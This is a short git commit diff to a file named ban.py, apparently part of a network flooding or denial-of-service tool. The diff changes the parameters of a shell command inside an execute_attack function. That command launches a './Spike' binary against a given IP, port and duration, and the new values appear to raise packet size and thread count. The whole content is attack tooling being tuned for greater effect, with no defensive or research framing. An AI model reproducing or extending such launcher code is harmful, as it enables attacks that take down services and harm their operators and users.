7e1affed4050ecd0604ee1c1514abd17a791f3f4
Titanop242424 <optitan317@gmail.com>
2025-08-19 10:58:03 +0530

    Update ban.py

--- ban.py
+++ ban.py
@@ -280,7 +280,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 1024 10",
+            f"./Spike {ip} {port} {duration} 1400 25",
             stderr=asyncio.subprocess.PIPE
         )
 
